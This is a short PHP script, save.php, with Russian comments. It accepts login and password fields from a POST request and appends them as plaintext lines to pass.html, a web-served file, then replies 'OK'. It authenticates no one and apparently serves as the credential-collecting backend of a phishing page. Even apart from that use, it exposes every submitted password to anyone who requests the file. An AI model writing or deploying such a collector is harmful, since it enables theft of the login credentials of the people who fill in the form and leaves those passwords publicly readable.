<?php
// save.php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login']) && isset($_POST['password'])) {
    $login = htmlspecialchars($_POST['login']);
    $password = htmlspecialchars($_POST['password']);

    // Форматируем запись (можно заменить на JSON или CSV)
    $entry = "Login: $login | Password: $password\n";

    // Файл для хранения данных
    $file = 'pass.html';

    // Пытаемся дописать в файл
    if (file_put_contents($file, $entry, FILE_APPEND | LOCK_EX)) {
        echo "OK";
    } else {
        http_response_code(500);
        echo "Ошибка записи данных";
    }
} else {
    http_response_code(400);
    echo "Неверный запрос";
}
?>
